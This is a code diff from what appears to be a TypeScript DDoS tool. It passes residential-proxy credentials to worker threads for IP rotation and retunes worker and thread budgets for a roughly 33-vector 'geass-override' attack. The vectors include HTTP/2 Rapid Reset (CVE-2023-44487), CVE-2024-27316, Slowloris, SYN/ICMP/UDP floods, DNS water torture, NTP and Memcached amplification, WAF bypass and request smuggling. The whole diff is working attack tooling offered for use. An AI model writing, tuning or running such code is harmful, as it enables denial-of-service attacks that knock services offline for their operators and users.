@@ -293,8 +293,9 @@ function spawnPool(
   const workers: Worker[] = [];
   const workerConns = new Array<number>(numWorkers).fill(0);
   // Pass ALL fastest proxies (HTTP + SOCKS5) to workers for maximum IP rotation
+  // CRITICAL: include username/password so authenticated proxies (residential) work in workers
   const proxies = HTTP_PROXY_METHODS.has(method) && proxyCache.length > 0
-    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined }))
+    ? proxyCache.map(p => ({ host: p.host, port: p.port, type: p.type as "http" | "socks5" | undefined, username: p.username, password: p.password }))
     : [];
 
   return new Promise<void>((resolve) => {
@@ -307,12 +308,12 @@ function spawnPool(
         ? threads - threadsPerWorker * (numWorkers - 1)
         : threadsPerWorker;
 
-      // In dev: cap worker heap to avoid container OOM (prod has 32GB, no limit needed)
+      // Always cap worker heap — prevents OS-level OOM kill on deployed containers.
+      // Production: 512MB per worker keeps total under container limit.
+      // Dev: 256MB to avoid local OOM on smaller machines.
       const workerOpts: import("worker_threads").WorkerOptions = {
         workerData: { method, target, port, threads: t, proxies },
-        ...(process.env.NODE_ENV !== "production" && {
-          resourceLimits: { maxOldGenerationSizeMb: 512 },
-        }),
+        resourceLimits: { maxOldGenerationSizeMb: process.env.NODE_ENV === "production" ? 512 : 256 },
       };
       const w = new Worker(WORKER_FILE, workerOpts);
       const idx = i;
@@ -409,72 +410,76 @@ async function runAttackWorkers(
   // ★ ADAPTIVE BURST MODE: after 30s, top 5 vectors auto-spike to +50% threads for 10s waves
   // ★ WORKER SCALING: I/O-bound vectors → 2× CPU_COUNT workers each
   if (method === "geass-override") {
-    // ── Worker counts — doubled from previous version for maximum parallelism ──
-    const connW    = 6;  // 6×: nginx worker_connections exhaustion (was 3)
-    const slowW    = 6;  // 6×: Slowloris = 300K half-open connections (was 3)
-    const h2W      = Math.max(24, CPU_COUNT * 3);  // ≥24 — CVE-2023-44487 (was max(16, CPU*2))
-    const contW    = Math.max(16, CPU_COUNT * 2);  // ≥16 — CVE-2024-27316 OOM (was max(12, CPU*2))
-    const hpackW   = Math.max(12, CPU_COUNT * 2);  // ≥12 — HPACK eviction (was max(8, CPU))
-    const wafW     = Math.max(10, CPU_COUNT);      // ≥10 — Chrome fingerprint (was max(8, CPU))
-    const wsW      = 4;   // 4× WebSocket exhaustion
-    const gqlW     = 4;   // 4× GraphQL exponential
-    const rudyW    = 6;   // 6× multipart slow POST
-    const cacheW   = 4;   // 4× CDN cache eviction
-    const tlsW     = Math.max(6, CPU_COUNT);       // ≥6 — RSA renegotiation CPU
-    const quicW    = 2;   // 2× QUIC/H3
-    const sslW     = 4;   // 4× SSL Death Record
-    const stormW   = Math.max(16, CPU_COUNT * 2);  // ≥16 — H2 Settings Storm (was max(12, CPU*2))
-    const pipeW    = Math.max(24, CPU_COUNT * 3);  // ≥24 — HTTP Pipeline (was max(16, CPU*2))
-    const bypassW  = Math.max(8,  CPU_COUNT);      // ≥8  — Chrome bypass
-    const kaW      = Math.max(6,  CPU_COUNT);      // ≥6  — Keepalive exhaust (was max(4, CPU))
-    const pingW    = Math.max(8,  CPU_COUNT * 2);  // ≥8  — H2 PING storm (was max(4, CPU))
-    const smugW    = Math.max(6,  CPU_COUNT);      // ≥6  — HTTP smuggling (was max(4, CPU))
-    const xmlW     = 4;   // 4× XML bomb (was 3)
-    const slowRW   = 5;   // 5× Slow Read (was 4)
-    const rangeW   = 5;   // 5× Range Flood (was 4)
-    const appW     = Math.max(12, CPU_COUNT * 2);  // ≥12 — App Smart Flood (was max(8, CPU))
-    const lhbW     = Math.max(12, CPU_COUNT * 2);  // ≥12 — Large Header Bomb (was max(8, CPU))
-    const prioW    = Math.max(10, CPU_COUNT * 2);  // ≥10 — H2 PRIORITY Storm (was max(6, CPU))
-    const synW     = 4;   // 4× SYN flood (was 2)
+    // ── Worker counts — calibrated for stable deployment containers (4-8GB RAM) ──
+    // slowloris/conn-flood each hold thousands of persistent TLS sockets → 1 worker each
+    // HTTP/H2 workers are stateless (fast req/response) → scale with CPU_COUNT
+    const connW    = 1;                               // 1× conn-flood (12K persistent TLS sockets each)
+    const slowW    = 1;                               // 1× slowloris  (15K persistent TLS sockets each)
+    const h2W      = Math.max(6, CPU_COUNT);          // ≥6 — CVE-2023-44487 (stateless, scales well)
+    const contW    = Math.max(4, Math.floor(CPU_COUNT * 0.75)); // ≥4 — CVE-2024-27316 OOM
+    const hpackW   = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — HPACK eviction
+    const wafW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Chrome fingerprint
+    const wsW      = 1;                               // 1× WS exhaust (5K persistent WS sockets each)
+    const gqlW     = 2;                               // 2× GraphQL exponential
+    const rudyW    = 1;                               // 1× multipart slow POST (persistent)
+    const cacheW   = 2;                               // 2× CDN cache eviction
+    const tlsW     = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — RSA renegotiation CPU
+    const quicW    = 1;                               // 1× QUIC/H3 UDP
+    const sslW     = 2;                               // 2× SSL Death Record
+    const stormW   = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — H2 Settings Storm
+    const pipeW    = Math.max(6, CPU_COUNT);          // ≥6 — HTTP Pipeline (stateless, high throughput)
+    const bypassW  = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Chrome bypass
+    const kaW      = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — Keepalive exhaust
+    const pingW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PING storm
+    const smugW    = 2;                               // 2× HTTP smuggling
+    const xmlW     = 1;                               // 1× XML bomb (CPU-bound, 1 is enough)
+    const slowRW   = 1;                               // 1× Slow Read (persistent connections)
+    const rangeW   = 2;                               // 2× Range Flood
+    const appW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — App Smart Flood
+    const lhbW     = Math.max(4, Math.floor(CPU_COUNT / 2) + 2);// ≥4 — Large Header Bomb
+    const prioW    = Math.max(3, Math.floor(CPU_COUNT / 2));    // ≥3 — H2 PRIORITY Storm
+    const synW     = 1;                               // 1× SYN flood (UDP-like, 1 is enough)
     // L3/UDP — single worker with high socket concurrency
     const icmpW    = 1;  const dnsW = 1;  const ntpW = 1;
     const memW     = 1;  const ssdpW = 1; const udpW = 1; const dohW = 1;
 
-    // ── Thread budget — 32GB/8vCPU ARES OMNIVECT ∞ (33-vector) — v3 +25% ──
-    const connT    = Math.max(500,  Math.round(threads * 0.10)); // +25% conn flood
-    const slowT    = Math.max(500,  Math.round(threads * 0.10)); // +25% slowloris
-    const h2T      = Math.max(7500, Math.round(threads * 0.62)); // ★★★ CVE-2023-44487 +25%
-    const contT    = Math.max(5000, Math.round(threads * 0.45)); // ★★★ CVE-2024-27316 +25%
-    const hpackT   = Math.max(3200, Math.round(threads * 0.35)); // ★★ HPACK storm +25%
-    const wafT     = Math.max(2500, Math.round(threads * 0.35)); // ★★ Chrome WAF bypass +25%
-    const wsT      = Math.max(400,  Math.round(threads * 0.10)); // +25% WS flood
-    const gqlT     = Math.max(250,  Math.round(threads * 0.07)); // +25% GraphQL
-    const udpT     = Math.max(320,  Math.round(threads * 0.08)); // +25% UDP
-    const rudyT    = Math.max(300,  Math.round(threads * 0.09)); // +25% RUDY
-    const cacheT   = Math.max(250,  Math.round(threads * 0.07)); // +25% cache poison
-    const tlsT     = Math.max(250,  Math.round(threads * 0.07)); // +25% TLS renego
-    const quicT    = Math.max(160,  Math.round(threads * 0.05)); // +25% QUIC
-    const sslT     = Math.max(500,  Math.round(threads * 0.10)); // ★ SSL Death Record +25%
-    const stormT   = Math.max(3750, Math.round(threads * 0.50)); // ★★★ H2 Settings Storm +25%
-    const pipeT    = Math.max(12500,Math.round(threads * 0.75)); // ★★★ HTTP Pipeline +25%
-    const bypassT  = Math.max(1250, Math.round(threads * 0.22)); // ★ Chrome bypass +25%
-    const kaT      = Math.max(750,  Math.round(threads * 0.15)); // Keepalive exhaust +25%
-    const pingT    = Math.max(1900, Math.round(threads * 0.28)); // H2 PING storm +25%
-    const smugT    = Math.max(400,  Math.round(threads * 0.10)); // HTTP smuggling +25%
-    const xmlT     = Math.max(250,  Math.round(threads * 0.06)); // XML bomb +25%
-    const slowRT   = Math.max(500,  Math.round(threads * 0.09)); // Slow Read +25%
-    const rangeT   = Math.max(750,  Math.round(threads * 0.12)); // Range flood +25%
-    const synT     = Math.max(2560, Math.round(threads * 0.15)); // ★ SYN flood +25%
+    // ── Thread budget — calibrated for deployment containers (4-8GB RAM) ──
+    // Percentages apply to user's thread slider; Math.max sets minimum floor per worker.
+    // With Geass preset at 3000 threads, minimums rarely apply — % values dominate.
+    const connT    = Math.max(200,  Math.round(threads * 0.10)); // conn-flood
+    const slowT    = Math.max(200,  Math.round(threads * 0.10)); // slowloris
+    const h2T      = Math.max(1000, Math.round(threads * 0.62)); // ★★★ CVE-2023-44487
+    const contT    = Math.max(800,  Math.round(threads * 0.45)); // ★★★ CVE-2024-27316
+    const hpackT   = Math.max(600,  Math.round(threads * 0.35)); // ★★ HPACK storm
+    const wafT     = Math.max(500,  Math.round(threads * 0.35)); // ★★ Chrome WAF bypass
+    const wsT      = Math.max(200,  Math.round(threads * 0.10)); // WS flood
+    const gqlT     = Math.max(100,  Math.round(threads * 0.07)); // GraphQL
+    const udpT     = Math.max(150,  Math.round(threads * 0.08)); // UDP
+    const rudyT    = Math.max(100,  Math.round(threads * 0.09)); // RUDY
+    const cacheT   = Math.max(100,  Math.round(threads * 0.07)); // cache poison
+    const tlsT     = Math.max(100,  Math.round(threads * 0.07)); // TLS renego
+    const quicT    = Math.max(80,   Math.round(threads * 0.05)); // QUIC
+    const sslT     = Math.max(200,  Math.round(threads * 0.10)); // SSL Death Record
+    const stormT   = Math.max(800,  Math.round(threads * 0.50)); // ★★★ H2 Settings Storm
+    const pipeT    = Math.max(1500, Math.round(threads * 0.75)); // ★★★ HTTP Pipeline
+    const bypassT  = Math.max(300,  Math.round(threads * 0.22)); // Chrome bypass
+    const kaT      = Math.max(200,  Math.round(threads * 0.15)); // Keepalive exhaust
+    const pingT    = Math.max(400,  Math.round(threads * 0.28)); // H2 PING storm
+    const smugT    = Math.max(100,  Math.round(threads * 0.10)); // HTTP smuggling
+    const xmlT     = Math.max(80,   Math.round(threads * 0.06)); // XML bomb
+    const slowRT   = Math.max(100,  Math.round(threads * 0.09)); // Slow Read
+    const rangeT   = Math.max(150,  Math.round(threads * 0.12)); // Range flood
+    const synT     = Math.max(400,  Math.round(threads * 0.15)); // SYN flood
     // L3/UDP — each gets its own thread pool
-    const icmpT    = Math.max(2560, Math.round(threads * 0.15)); // ICMP +25%
-    const dnsT     = Math.max(2560, Math.round(threads * 0.10)); // DNS Water Torture +25%
-    const ntpT     = Math.max(2560, Math.round(threads * 0.09)); // NTP mode 7 +25%
-    const memT     = Math.max(1280, Math.round(threads * 0.07)); // Memcached +25%
-    const ssdpT    = Math.max(1280, Math.round(threads * 0.07)); // SSDP M-SEARCH +25%
-    const dohT     = Math.max(400,  Math.round(threads * 0.06)); // DoH flood +25%
-    const appT     = Math.max(2500, Math.round(threads * 0.30)); // ★★ App Smart Flood +25%
-    const lhbT     = Math.max(1875, Math.round(threads * 0.22)); // ★★ Large Header Bomb +25%
-    const prioT    = Math.max(1500, Math.round(threads * 0.25)); // ★★ H2 PRIORITY Storm +25%
+    const icmpT    = Math.max(400,  Math.round(threads * 0.15)); // ICMP
+    const dnsT     = Math.max(400,  Math.round(threads * 0.10)); // DNS Water Torture
+    const ntpT     = Math.max(400,  Math.round(threads * 0.09)); // NTP mode 7
+    const memT     = Math.max(200,  Math.round(threads * 0.07)); // Memcached
+    const ssdpT    = Math.max(200,  Math.round(threads * 0.07)); // SSDP M-SEARCH
+    const dohT     = Math.max(100,  Math.round(threads * 0.06)); // DoH flood
+    const appT     = Math.max(500,  Math.round(threads * 0.30)); // ★★ App Smart Flood
+    const lhbT     = Math.max(400,  Math.round(threads * 0.22)); // ★★ Large Header Bomb
+    const prioT    = Math.max(350,  Math.round(threads * 0.25)); // ★★ H2 PRIORITY Storm
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
